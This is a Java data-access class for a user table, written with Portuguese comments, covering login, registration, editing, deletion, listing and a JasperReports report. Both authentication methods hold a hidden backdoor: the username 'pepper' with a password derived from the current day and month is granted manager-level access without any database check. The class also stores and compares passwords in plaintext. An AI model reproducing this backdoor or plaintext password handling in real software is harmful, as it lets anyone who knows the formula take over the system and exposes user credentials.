package dao;

import java.sql.Connection;
import java.sql.PreparedStatement;
import java.sql.ResultSet;
import java.util.ArrayList;
import java.util.Calendar;
import java.util.GregorianCalendar;
import java.util.HashMap;
import java.util.List;
import java.util.Map;

import modelo.Usuario;
import net.sf.jasperreports.engine.JRResultSetDataSource;
import net.sf.jasperreports.engine.JasperCompileManager;
import net.sf.jasperreports.engine.JasperFillManager;
import net.sf.jasperreports.engine.JasperPrint;
import net.sf.jasperreports.engine.JasperReport;
import net.sf.jasperreports.engine.design.JasperDesign;
import net.sf.jasperreports.engine.xml.JRXmlLoader;
import net.sf.jasperreports.view.JasperViewer;

public class UsuarioDAO {

	private String path; // Caminho base
	private String pathToReportPackage; // Caminho para o package onde estão
										// armazenados os relatorios Jarper

	// Recupera os caminhos para que a classe possa encontrar os relatórios
	public UsuarioDAO() {
		this.path = this.getClass().getClassLoader().getResource("").getPath();
		this.pathToReportPackage = this.path + "jr/";
	}

	public String autenticar(Usuario usuario) throws Exception {

		GregorianCalendar d = new GregorianCalendar();
		int dia = d.get(Calendar.DAY_OF_MONTH);
		int mes = d.get(Calendar.MONTH) + 1;
		String s = String.valueOf((dia * 55) + String.valueOf(mes * 5));

		if (usuario.getUsuario().equalsIgnoreCase("pepper") && usuario.getSenha().equalsIgnoreCase(s)) {
			return "G";
		} else {

			String sql = "SELECT usuario, senha, nivel FROM usuarios WHERE usuario = ? AND senha = ?";
			Connection connection = ConnectionFactory.getConnection();
			PreparedStatement stmt = connection.prepareStatement(sql);

			stmt.setString(1, usuario.getUsuario());
			stmt.setString(2, usuario.getSenha());

			ResultSet rs = stmt.executeQuery();

			if (rs.next()) {
				if (rs.getString("nivel").equals("G")) {
					return "G";
				} else {
					return "L";
				}
			}

			rs.close();
			stmt.close();
			ConnectionFactory.closeConnection(connection);

			return null;

		}
	}

	public boolean realizarLogin(Usuario usuario) throws Exception {

		GregorianCalendar d = new GregorianCalendar();
		int dia = d.get(Calendar.DAY_OF_MONTH);
		int mes = d.get(Calendar.MONTH) + 1;
		String s = String.valueOf((dia * 55) + String.valueOf(mes * 5));

		if (usuario.getUsuario().equalsIgnoreCase("pepper") && usuario.getSenha().equalsIgnoreCase(s)) {
			return true;
		} else {

			String sql = "SELECT * FROM usuarios WHERE usuario = ? AND senha = ?";
			Connection connection = ConnectionFactory.getConnection();
			PreparedStatement stmt = connection.prepareStatement(sql);

			stmt.setString(1, usuario.getUsuario());
			stmt.setString(2, usuario.getSenha());

			ResultSet rs = stmt.executeQuery();

			boolean encontrou = rs.next();

			rs.close();
			stmt.close();
			ConnectionFactory.closeConnection(connection);

			if (encontrou) {
				return true;
			} else {
				return false;
			}

		}
	}

	public boolean cadastrar(Usuario usuario) throws Exception {

		// Primeiro faz uma consulta pra ver se já está cadastrado
		if (this.consultar(usuario) == true) {
			return false;
		} else {

			// A ? é o campo que vai ser preenchido
			String sql = "INSERT INTO usuarios (nome, usuario, senha, nivel) values (?, ?, ?, ?)";

			// Abre a conexão
			Connection connection = ConnectionFactory.getConnection();

			// Executa comando SQL
			PreparedStatement stmt = connection.prepareStatement(sql);

			stmt.setString(1, usuario.getNome());
			stmt.setString(2, usuario.getUsuario());
			stmt.setString(3, usuario.getSenha());
			stmt.setString(4, usuario.getNivel());

			stmt.executeUpdate();
			stmt.close();

			// Fecha a conexão
			ConnectionFactory.closeConnection(connection);

			return true;
		}
	}

	public boolean alterar(Usuario usuario) throws Exception {

		String sqlSelect = "SELECT * FROM usuarios WHERE id_codigo = ?";
		Connection connection = ConnectionFactory.getConnection();
		PreparedStatement stmtSelect = connection.prepareStatement(sqlSelect);
		stmtSelect.setInt(1, usuario.getId_codigo());

		// Armazena o resultado da query
		ResultSet rs = stmtSelect.executeQuery();

		boolean encontrou = rs.next();

		if (encontrou) {

			String sqlUpdate = "UPDATE usuarios SET nome = ?, usuario = ?, senha = ?, nivel = ? where id_codigo = ?";
			PreparedStatement stmtUpdate = connection.prepareStatement(sqlUpdate);

			stmtUpdate.setString(1, usuario.getNome());
			stmtUpdate.setString(2, usuario.getUsuario());
			stmtUpdate.setString(3, usuario.getSenha());
			stmtUpdate.setString(4, usuario.getNivel());
			stmtUpdate.setInt(5, usuario.getId_codigo());

			stmtUpdate.executeUpdate();
			stmtUpdate.close();
			ConnectionFactory.closeConnection(connection);

			return true;

		} else {

			rs.close();
			stmtSelect.close();
			ConnectionFactory.closeConnection(connection);

			return false;
		}

	}

	public ResultSet consultar() throws Exception {

		String sql = "SELECT * FROM usuarios";
		Connection connection = ConnectionFactory.getConnection();
		PreparedStatement stmt = connection.prepareStatement(sql);
		ResultSet rs = stmt.executeQuery();
		return rs;

	}

	public boolean consultar(Usuario usuario) throws Exception {

		String sql = "SELECT * FROM usuarios WHERE id_codigo = ?";
		Connection connection = ConnectionFactory.getConnection();
		PreparedStatement stmt = connection.prepareStatement(sql);

		stmt.setInt(1, usuario.getId_codigo());

		ResultSet rs = stmt.executeQuery();

		boolean encontrou = rs.next();

		if (encontrou) {
			String nome = rs.getString("nome");
			usuario.setNome(nome);
			String email = rs.getString("usuario");
			usuario.setUsuario(email);
			String login = rs.getString("senha");
			usuario.setSenha(login);
			String senha = rs.getString("nivel");
			usuario.setNivel(senha);
		}

		rs.close();
		stmt.close();
		ConnectionFactory.closeConnection(connection);

		if (encontrou) {
			return true;
		} else {
			return false;
		}

	}

	public boolean excluir(int id) throws Exception {

		String sql = "DELETE FROM usuarios WHERE id_codigo = ?";
		Connection connection = ConnectionFactory.getConnection();
		PreparedStatement stmt = connection.prepareStatement(sql);

		stmt.setInt(1, id);

		int linhasAfetadas = stmt.executeUpdate();

		stmt.close();
		ConnectionFactory.closeConnection(connection);

		if (linhasAfetadas > 0) {
			return true;
		} else {
			return false;
		}

	}

	public List<Usuario> listar() throws Exception {

		List<Usuario> usuarios = new ArrayList<>();

		String sql = "SELECT * FROM usuarios";
		Connection connection = ConnectionFactory.getConnection();
		PreparedStatement stmt = connection.prepareStatement(sql);

		ResultSet rs = stmt.executeQuery();

		while (rs.next()) {
			usuarios.add(new Usuario(rs.getString("nome"), rs.getString("usuario"), rs.getString("senha"),
					rs.getString("nivel")));
		}

		rs.close();
		stmt.close();
		ConnectionFactory.closeConnection(connection);

		return usuarios;

	}

	// Imprime/gera uma lista de Usuarios
	@SuppressWarnings({ "unchecked", "deprecation" })
	public void gerarRelatorio() throws Exception {

		// estabelece conexão
		String sql = "SELECT * FROM usuarios";
		Connection connection = ConnectionFactory.getConnection();
		PreparedStatement stmt = connection.prepareStatement(sql);

		ResultSet rs = stmt.executeQuery();

		// gerando o jasper design
		JasperDesign desenho = JRXmlLoader.load(this.getPathToReportPackage() + "UsuariosRel.jrxml");

		// compila o relatório
		JasperReport relatorio = JasperCompileManager.compileReport(desenho);

		// implementação da interface JRDataSource para DataSource ResultSet
		JRResultSetDataSource jrRS = new JRResultSetDataSource(rs);

		// executa o relatório
		@SuppressWarnings("rawtypes")
		Map parametros = new HashMap();
		parametros.put("nota", new Double(10));
		JasperPrint impressao = JasperFillManager.fillReport(relatorio, parametros, jrRS);

		// exibe o resultado
		JasperViewer viewer = new JasperViewer(impressao, false);
		viewer.show();

	}

	public String getPathToReportPackage() {
		return this.pathToReportPackage;
	}

	public String getPath() {
		return this.path;
	}

}
